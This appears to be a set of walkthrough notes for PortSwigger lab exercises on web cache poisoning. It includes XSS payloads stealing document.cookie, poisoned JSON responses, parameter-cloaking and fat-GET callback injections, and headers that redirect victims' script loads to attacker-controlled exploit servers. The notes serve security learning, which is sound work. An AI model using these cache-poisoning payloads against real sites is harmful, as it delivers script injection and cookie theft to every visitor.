# Web cache poisoning

- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/research/practical-web-cache-poisoning
- https://portswigger.net/research/web-cache-entanglement
- https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

We are looking for unkeyed values (headers, params), that are being reflected on the response page.

## Web cache poisoning with an unkeyed header

We can find out that the cache is probably being used by headers like `X-Cache: hit` or `X-Cache: miss`. In order to successfully test for cache poisoning we can use a cache buster (such as a unique parameter), that will limit the response to us only.

Using Param Miner we can find out, that the server supports `X-Forwarded-Host` header and once provided its value is being reflected in the address of the tracking js script that should be loaded. `Guess headers` with added options like `poison only` and `cache buster` will try to find and report only valueable output.

Now we can create a `/resources/js/tracking.js` file at our exploit server containing `alert(document.cookie)` script, and poison a cache to the home poge at `/` with `X-Forwarded-Host` header pointing to `exploit-0af1000703699b68801bdebc0129001c.exploit-server.net`, making every next request maching cache keys receive a page loading our malicious script instead of the tracking one.

## Web cache poisoning with an unkeyed cookie

The `fehost` cookie is being set upon hitting the cache for the first time and its value is then reflected on the page in a script tag. 

Upon adding custom cache buster (`?cb=123` query param) we can notice that changing the cookie value to `XXX`, performing a request that misses cache, and the performing other request with cookie set to `YYY` responds with `XXX` being reflected on the page, which proves the cookie is unkeyed value.

Chaning the cookie value to `prod-cache-01"};alert(1);x={"a":"b` with custom cache buster and then requesting the same page with normal cookie discovers that the reflected value is not being sanitizd and we are able to execute arbitrary code and poison a cache with it, which done again withour cache buster solves the lab.

## Web cache poisoning with multiple headers

Using Param Miner we are able to establish, that `x-forwarded-scheme` and `x-forwarded-host` headers are supported.

By adding `X-Forwarded-Scheme: http` to the request we notice 302 responde with redirection to the original host. Upon removing this header and leaving the same cache buster we still receive the redirection request.

When we add to that `X-Forwarded-Host: XXXX` header, we can notice redirection location now points to `XXXX` and after removing both headers, we see that the response was cached.

By adding the two below headers to the `GET /` request we are able to redirect anyone visiting the home to our server containing a malicious script.

```
X-Forwarded-Host: exploit-0aea00e203731cf781f556c601a60079.exploit-server.net/exploit
X-Forwarded-Scheme: http
```

Since this does not have as much of an impact, we have to investigate further. We can notice that a request for a tracking js script `GET /resources/js/tracking.js` is also cacheable, and applying the same headers also causes it to poison the cache. Adding the below two headers will cache the response for requesting the tracking script, that will redirect to our domain.

```
X-Forwarded-Host: exploit-0aea00e203731cf781f556c601a60079.exploit-server.net
X-Forwarded-Scheme: http
```

Hosting our custom js file containing `alert(document.cookie)` along side with poisoning the cache of the previous request makes everyone accessing the home page trigger an XSS and solve the lab.

## Targeted web cache poisoning using an unknown header

Using Param Miner we are able to discover that `x-host` header is supported.

By testing this param we can notice that its value is being reflected in the path to tracking js script and that the param is unkeyed.

By performing `GET /post?postId=1` request with `X-Host: exploit-0a170084036989dd8247205801bb009d.exploit-server.net` header we are able to poison a cache, which will then make a every request to js tracking script to our server, on which we will host `alert(document.cookie)` content. Everyone visitng the post page will trigger an XSS performing alert function call.

Now in order to target the specific user, we need to get their `User-Agent`. This can be done by creating a new comment containing a link to our server. After visitng this post the `user-agent` will be logged. For this we create a new comment with a body:

```
<img src="https://exploit-0a170084036989dd8247205801bb009d.exploit-server.net/img.png" />
```

Now reading fromthe logs we notice the `user-agent` of the victim `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`.

Now we again perform poisoning the cache for the `/post?postId=1`, but this time changing the request `user-agent` to the victims one and adding `Vary: User-Agent`. By this we will add to cache key particular `User-Agent`, limiting the cache poisoning only to that particular one, which after creating a new comment solves the lab.

## Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

By inspecting the loaded content we can notice `geolocate.js` script, which fetches the content from provided as param url and passes it without sanitization into `innerHtml` sink.

The function `initGeoLocate` performing this action is invoked in the main page and uses the param `data.host`, which is defined in other part of the file in different `script` tag.

Param Miner was able to find `x-forwarded-host` header and we can confirm that it is being reflected in the `data.host` param, which, if poisoned, could potentially trigger an XXS by pointing it to our server, which will serve a payload passed to `innerHtml` sink.

Using `x-forwarded-host` header we are able to poison the cache, which for further requests not containing the header still respond with reflected malicious host value. `session` cookie and `User-Agent` header seem to be unkeyed values.

Now we can poison home page by performing `GET /` request with `X-Forwarded-Host: exploit-0ae0008c04b99d6f80a99890016d00b3.exploit-server.net` header. The Exploit server neet to be configured to serve proper file and respond with proper headers.

File should be available at path `/resources/json/geolocate.json`. The headers should support CORS and have proper for json content type set:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: https://0ab8005b04999d5280dc99e3003f0003.web-security-academy.net
```

The content of the response should be a json, which `country` param will be unsafetly passed to `innerHtml` sink:

```
{
    "country": "United Kingdom <img src=X onerror=alert(document.cookie) />"
}
```

Poisoning the cache this way and serving this file solves the lab.

## Combining web cache poisoning vulnerabilities

Using Para Miner we are able to locate `x-forwarded-host` and `x-original-url` headers that are supported.

Same situation as in the previous labs with poisoning the host in `data.host` variable which then is used to fetch data and pass in without sanitization to `innerHtml` sink. `x-forwarded-host` is unkeyed but is again reflected on the page, which makes the same technique usable.

The problem here is that the English language chosen by default by victim is not translated and no unsafe `innerHtml` call would be invoked. That is guarded by `lang.toLowerCase() !== 'en'` check, so modifying response to contain malicious translation for english would not work. `select` tag options are created using the same response, but with `innerText`.

By performing regular request to `/` and then adding `X-Original-Url: /setlang/es`, we notice that we receive `X-Cache: hit`, which means we hit the cache, so the `X-Original-Url` is unkeyed. After waiting for a while, sending regular request to the `/` with that header, results in language change, setting new language and performing redirection with a new query param `localized=1`. This means we could potentially posiono `/` to change a language and poison `/?localized=1` to fetch malicious data from our server to perform XSS.

Ufortunately this 302 redirection response cannot be cached, because it contains the `Set-Cookie` header. But if we change `X-Original-Url` value to `/setlang\en` will perform redirect to `/setlang/en` and cache it.

Now we have all the pieces to solve the lab. First poison `/` path with `X-Original-Url: /setlang\es`. Next poison `/?localized=1` with `X-Forwarded-Host: exploit-0a1b008804c63040828ddc8201e100d9.exploit-server.net` and then prepare our malicious payload which will be donwloaded.

File should be available at `/resources/json/translations.json` and contain:

```
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "espaÃ±ol",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "Ver detailes <img src=X onerror=alert(document.cookie) />",
            "Description:": "DescripciÃ³n:"
        }
    }
}
```

Response header should be configured to allow CORS:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: https://0a17008b045e30d882a6dd2500a2007a.web-security-academy.net
```

Everyone visiting `/` home page will receive cached redirection to language change and then to `/?localized=1` with cookie set to Espaniol. Poisoned `/?localized=1` with reflected host header will fetch the data from our malicious server and pass unsafely to `innerHtml` solving the lab.

## Web cache poisoning via an unkeyed query string

Note: `Pragma: x-get-cache-key` header can be used to display cache key from the server.

This time we can notice that at `GET /` and `GET /post` request query string is unkeyed. By performing one request and follow up with another requests containing random new query params, removed previous query params etc. we still receive `X-Cache: hit` and the original response.

Param Miner or header keyed values can be used for cache busters in order to help with testing.

The full host and path is reflected into the page without any encoding, therefore poisoning the cache with `/?q='+/><script>alert(1)</script>` will serve the XXS payload for everyone visiting `/`

## Web cache poisoning via an unkeyed query parameter

Again in the same place the url is being reflected into the page and again accessing `/?q='+/><script>alert(1)</script>` will trigger the XSS. But this time query string is a cache key.

Caches sometimes skip UTM analytics query parameters, since they are not required for the backend server. Therefore testing a few of them resulted in successfully finding unkeyed one `utm_content`.

Accessing `/?utm_content=' /><script>alert(1)</script>` successfuly poisons the cache and deliver XSS payload to all users visitng home page, solving the lab.

## Parameter cloaking

From quick examination, we can notice, that the caching server is preset, the query params are keyed and that some UTM params are removed from the cache keys. Accessing the same page twice second time responds with `X-Cache: hit`, adding a query param `q` results in a `miss`, but performing the same request with that param returns `hit`. Adding `utm_content` query param stills results in a `hit`, which proves it is excluded.

Now we can take a look at jsonp present at `/js/geolocate.js` used at the page with `callback=setCountryCookie` query param. Adding arbitrary query param `cb=1` and performing `/js/geolocate.js?callback=setCountryCookie&cb=1` request multiple times proves that this response is also being cached.

In order to discover discrepancies between cache and the server we perform the request `GET /js/geolocate.js?callback=setCountryCookie&cb=1&utm_content=1;callback=myFunction` makes use of that ruby allow separating parameters with `;` and once the same param is passed multiple times it takes the last occurance as value. Following by simple `GET /js/geolocate.js?callback=setCountryCookie&cb=1` request which, because the cache server does not allow `;` parameter separation and therefore removed whole `utm_content=1;callback=myFunction` part from cache, responds with the poisoned cached value containing `myFunction` as callback.

In order to solve the lab, perform `GET /js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1)%3bsetCountryCookie`, will posion a cache for every `GET /js/geolocate.js?callback=setCountryCookie` request happening on the home page for every visitor.

## Web cache poisoning via a fat GET request

Same jsonp request as in previous lab. This time we can notice, that by providing in the `GET /js/geolocate.js?callback=setCountryCookie` request additional body `callback=setLangCookie` will overwrite the `callback` param, not caching the body of the response.

This way we can poison the cache by setting the body to `callback=alert(1);setCountryCookie`, which will cache a response for `/js/geolocate.js?callback=setCountryCookie`, triggering XSS for every home page visitor, solving the lab.

Note1: GET request containg a body is called "Fat GET request"

Note2: "As long as the X-HTTP-Method-Override header is unkeyed, you could submit a pseudo-POST request while preserving a GET cache key derived from the request line."

## URL normalization

On 404 Not Found page we can notice the url is being reflected and, upon investigation, without any sanitization.

Performing `GET /post/a<script>alert(1)</script>` request with Burp results in a page containing malicious script, but accessing this url via browser URL encoded the tags and renders a page with simple string.

However once we test send the request via Burp and then quickly access it in a browser we receive not encoded string triggering the XSS. This is because the cache server must be performing URL normalization before storing the key or responding to the client. `/post/a%3Cscript%3Ealert(1)%3C/script%3E` and `/post/a<script>alert(1)</script>` must be the same string for it, so it responds with the cached page containing XSS.

Therefore we can, using Burp, poison the cache and deliver the link to the victim, which despite being url encoded, will lead to cached not encoded page triggering the XSS, which solves the lab.
